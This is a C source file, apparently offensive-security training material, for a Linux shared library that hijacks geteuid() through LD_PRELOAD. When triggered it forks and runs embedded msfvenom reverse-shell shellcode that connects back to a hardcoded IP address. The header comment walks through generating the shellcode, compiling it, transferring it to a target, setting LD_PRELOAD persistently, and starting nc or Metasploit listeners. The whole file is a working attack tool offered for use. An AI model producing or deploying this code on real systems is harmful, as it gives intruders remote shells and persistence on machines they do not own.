/*
================================================================
sharedLibrary_LD_PRELOAD.c — Shared Library Hijacking via LD_PRELOAD
================================================================
WHAT THIS DOES:
  Compiles as a Linux shared object (.so file). When loaded via
  LD_PRELOAD, it intercepts any call to geteuid() from any program.
  When the hook fires:
    1. Fork()s a child process
    2. In the child: makes the buf[] region executable with mprotect(),
       then runs the embedded shellcode
    3. In the parent: prints a message and calls the REAL geteuid()
       (so the intercepted program continues normally)

  This technique lets you inject a reverse shell payload into any
  SUID binary that calls geteuid(), or into any program you can run
  with LD_PRELOAD set.

HOW LD_PRELOAD WORKS:
  LD_PRELOAD tells the Linux dynamic linker to load your .so BEFORE
  the standard libraries. If your .so exports a function with the same
  name as a libc function (like geteuid), your version is called instead.
  This lets you intercept library calls from any program.

PRIVILEGE ESCALATION USE CASE:
  If a SUID root binary calls geteuid(), you can get it to run your
  shellcode as root. The SUID binary's LD_PRELOAD won't work for most
  SUID binaries (Linux ignores LD_PRELOAD for SUID executables as a
  security measure), but it works for non-SUID programs running as a
  privileged user.

BEFORE YOU COMPILE — PREPARE YOUR SHELLCODE:
  1. Generate raw shellcode on Kali:
       msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=<YOUR_IP> LPORT=443 -f c
  2. Paste the byte string into buf[] below (replace the existing one)

COMPILE (on Kali — two-step process):
  Step 1: Compile to object file (position-independent, executable stack):
    gcc -Wall -fPIC -z execstack \
      -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c

  Step 2: Link into a shared library:
    gcc -shared -o sharedLibrary_LD_PRELOAD.so \
      sharedLibrary_LD_PRELOAD.o -ldl

  Result: sharedLibrary_LD_PRELOAD.so

DEPLOY AND RUN:
  Transfer the .so file to the target Linux machine.

  Method 1 — LD_PRELOAD with any binary that calls geteuid():
    LD_PRELOAD=/path/to/sharedLibrary_LD_PRELOAD.so /usr/bin/find .
    LD_PRELOAD=/path/to/sharedLibrary_LD_PRELOAD.so bash

  Method 2 — Set in environment persistently:
    export LD_PRELOAD=/tmp/sharedLibrary_LD_PRELOAD.so
    ls    (any command that links against libc will trigger it)

  When any program that calls geteuid() is run with LD_PRELOAD set,
  your shellcode fires and connects back.

START YOUR LISTENER FIRST (on Kali):
  nc -lvnp 443
  OR:
  msfconsole -q -x "use exploit/multi/handler; \
    set payload linux/x64/shell_reverse_tcp; \
    set LHOST <YOUR_IP>; set LPORT 443; exploit -j"

BEFORE COMPILING, CHANGE:
  - buf[] -> your raw shellcode with YOUR LHOST/LPORT
================================================================
*/
#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// To compile:
// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
// gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

uid_t geteuid(void)
{
        // Get the address of the original 'geteuid' function
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");

        // Fork a new thread based on the current one
        if (fork() == 0)
        {
                // Execute shellcode in the new thread
                intptr_t pagesize = sysconf(_SC_PAGESIZE);

                // Make memory executable (required in libs)
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        // Handle error
                        perror("mprotect");
                        return -1;
                }

                // Cast and execute
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                // Original thread, call the original function
                printf("[Hijacked] Returning from function...\n");
                return (*old_geteuid)();
        }
        // This shouldn't really execute
        printf("[Hijacked] Returning from main...\n");
        return -2;
}